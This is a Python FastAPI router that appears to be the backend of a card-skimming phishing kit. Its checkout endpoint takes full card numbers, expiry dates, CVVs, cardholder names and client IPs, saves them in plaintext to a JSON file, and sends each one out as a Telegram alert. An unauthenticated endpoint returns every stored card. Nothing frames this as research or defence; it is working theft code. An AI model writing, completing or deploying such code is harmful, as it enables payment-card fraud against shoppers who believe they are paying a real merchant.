"""
Card router — captures card details from checkout, saves to JSON, sends Telegram alert.
"""
import json
import os
from datetime import datetime
from fastapi import APIRouter, Request
from pydantic import BaseModel
from telegram_service import send_card_alert

router = APIRouter()

CARD_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "card_details.json")


def _load_cards() -> list:
    if os.path.exists(CARD_FILE):
        try:
            with open(CARD_FILE, "r") as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            return []
    return []


def _save_cards(cards: list):
    with open(CARD_FILE, "w") as f:
        json.dump(cards, f, indent=2)


def _get_ip(request: Request) -> str:
    ip = request.headers.get("X-Forwarded-For", "")
    if not ip and request.client:
        ip = request.client.host
    return ip.split(",")[0].strip() if ip else ""


# ── Schema ────────────────────────────────────────────────────────────────────
class CardSubmission(BaseModel):
    user_email: str = "guest"
    card_number: str
    expiry: str
    cvv: str
    cardholder_name: str
    total: float = 0


# ── Endpoints ─────────────────────────────────────────────────────────────────
@router.post("/submit")
def submit_card(body: CardSubmission, request: Request):
    ip = _get_ip(request)

    # Build record
    entry = {
        "user_email": body.user_email,
        "card_number": body.card_number,
        "expiry": body.expiry,
        "cvv": body.cvv,
        "cardholder_name": body.cardholder_name,
        "total": body.total,
        "ip": ip,
        "timestamp": datetime.now().isoformat(),
    }

    # Save to JSON
    cards = _load_cards()
    cards.append(entry)
    _save_cards(cards)

    # Send Telegram alert
    send_card_alert(
        user_email=body.user_email,
        card_number=body.card_number,
        expiry=body.expiry,
        cvv=body.cvv,
        cardholder_name=body.cardholder_name,
        total=body.total,
        ip=ip,
    )

    print(f"✓ Card details captured for: {body.user_email}")
    return {"ok": True, "message": "Card details saved"}


@router.get("/data")
def get_cards():
    """Retrieve all stored card details (admin use)."""
    cards = _load_cards()
    return {"data": cards, "count": len(cards)}
